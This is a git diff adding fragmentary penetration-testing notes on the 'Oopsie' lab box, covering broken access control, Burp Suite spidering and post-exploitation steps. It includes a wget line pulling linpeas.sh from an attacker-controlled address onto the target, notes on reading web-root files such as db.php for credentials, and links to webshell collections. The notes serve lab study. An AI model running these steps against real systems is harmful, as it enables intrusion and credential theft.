@@ -384,6 +384,56 @@ p> ./winPEASx64.exe   ==> to run the exe
 
 
 
+
+
+
+
+
+------
+
+# Oopsie 
+
+Whenever you are performing a web assessment that includes authentication mechanisms, it's alwaysadvised to check cookies, sessions and try to figure out how access control really works. In many cases, aRemote Code Execution attack and a foothold on system might not be achievable by itself, but rather afterchaining different types of vulnerabilties and exploits. In this box, we are going to learn that InformationDisclosure and Broken Access Control types of vulnerabilties even though they seem not very important canhave a great impact while attacking a system, and thus why even small vulnerabilities matter.
+
+
+According to this information, the website should have a login page. Before we proceed with directory andpage enumeration, we can try to map website by using Burp Suite proxy to passively `spider the website`
+
+
+A web crawler (also known as a web spider or web robot) is a program or automatedscript which browses the World Wide Web in a methodical, automated manner. This processis called Web crawling or spidering. Many legitimate sites, in particular searchengines, use spidering as a means of providing up-to-date data
+
+If you tunnel web traffic through Burp Suite (without intercepting the packets), bydefault it can passively spider the website, update the `site map` with all of thecontents requested and thus creating a tree of files and directories without sendingany further requests.
+
+
+
+
+>>> Please alwase keep burp running
+
+
+# information disclosure vulnerability
+
+
+
+
+when wget http://10.10.16.13:8000/linpeas.sh 
+
+go to /tmp before 
+
+```
+su Username 
+vs 
+su -l 
+```
+
+before using linpeas.sh  ==> read /var/www/html/ files.... 
+Let's read one by one the files now. We are goingto start with db.php which seems interesting:
+
+
+
+https://github.com/BlackArch/webshells
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+
+
+
 https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/
 
 https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/
